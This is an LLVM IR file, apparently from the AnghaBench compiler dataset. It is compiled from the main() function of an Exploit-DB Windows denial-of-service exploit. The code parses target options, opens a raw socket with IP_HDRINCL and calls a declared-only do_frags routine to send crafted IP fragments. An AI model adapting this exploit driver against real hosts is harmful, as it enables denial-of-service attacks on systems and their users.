; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_214.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_214.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"s:p:h\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [26 x i8] c"Bad source address given.\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"Invalid port number given.\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"Bad destination address given.\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@spf_sck = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [11 x i8] c"IP_HDRINCL\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [32 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @usage(i8* %17)
  br label %19

19:                                               ; preds = %14, %2
  %20 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %21 = call i32 @gethostname(i8* %20, i32 32)
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %23 = call i32 @host_to_ip(i8* %22)
  store i32 %23, i32* %6, align 4
  br label %24

24:                                               ; preds = %57, %19
  %25 = load i32, i32* %4, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = call i32 @getopt(i32 %25, i8** %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* @EOF, align 4
  %29 = icmp ne i32 %27, %28
  br i1 %29, label %30, label %58

30:                                               ; preds = %24
  %31 = load i32, i32* %8, align 4
  switch i32 %31, label %52 [
    i32 115, label %32
    i32 112, label %40
    i32 104, label %51
  ]

32:                                               ; preds = %30
  %33 = load i8*, i8** @optarg, align 8
  %34 = call i32 @host_to_ip(i8* %33)
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %39, label %37

37:                                               ; preds = %32
  %38 = call i32 @quit(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  br label %39

39:                                               ; preds = %37, %32
  br label %57

40:                                               ; preds = %30
  %41 = load i8*, i8** @optarg, align 8
  %42 = call i32 @atoi(i8* %41)
  store i32 %42, i32* %10, align 4
  %43 = load i32, i32* %10, align 4
  %44 = icmp sle i32 %43, 0
  br i1 %44, label %48, label %45

45:                                               ; preds = %40
  %46 = load i32, i32* %10, align 4
  %47 = icmp sgt i32 %46, 65535
  br i1 %47, label %48, label %50

48:                                               ; preds = %45, %40
  %49 = call i32 @quit(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  br label %50

50:                                               ; preds = %48, %45
  br label %57

51:                                               ; preds = %30
  br label %52

52:                                               ; preds = %30, %51
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @usage(i8* %55)
  br label %57

57:                                               ; preds = %52, %50, %39
  br label %24

58:                                               ; preds = %24
  %59 = load i8**, i8*** %5, align 8
  %60 = load i32, i32* %4, align 4
  %61 = sub nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8*, i8** %59, i64 %62
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @host_to_ip(i8* %64)
  store i32 %65, i32* %7, align 4
  %66 = load i32, i32* %7, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %70, label %68

68:                                               ; preds = %58
  %69 = call i32 @quit(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0))
  br label %70

70:                                               ; preds = %68, %58
  %71 = load i32, i32* @AF_INET, align 4
  %72 = load i32, i32* @SOCK_RAW, align 4
  %73 = load i32, i32* @IPPROTO_RAW, align 4
  %74 = call i32 @socket(i32 %71, i32 %72, i32 %73)
  store i32 %74, i32* @spf_sck, align 4
  %75 = load i32, i32* @spf_sck, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %79, label %77

77:                                               ; preds = %70
  %78 = call i32 @quit(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %79

79:                                               ; preds = %77, %70
  %80 = load i32, i32* @spf_sck, align 4
  %81 = load i32, i32* @IPPROTO_IP, align 4
  %82 = load i32, i32* @IP_HDRINCL, align 4
  %83 = bitcast i32* %9 to i8*
  %84 = call i64 @setsockopt(i32 %80, i32 %81, i32 %82, i8* %83, i32 4)
  %85 = icmp slt i64 %84, 0
  br i1 %85, label %86, label %88

86:                                               ; preds = %79
  %87 = call i32 @quit(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0))
  br label %88

88:                                               ; preds = %86, %79
  %89 = load i32, i32* @spf_sck, align 4
  %90 = load i32, i32* %6, align 4
  %91 = load i32, i32* %7, align 4
  %92 = load i32, i32* %10, align 4
  %93 = call i32 @do_frags(i32 %89, i32 %90, i32 %91, i32 %92)
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @gethostname(i8*, i32) #1

declare dso_local i32 @host_to_ip(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @quit(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @do_frags(i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
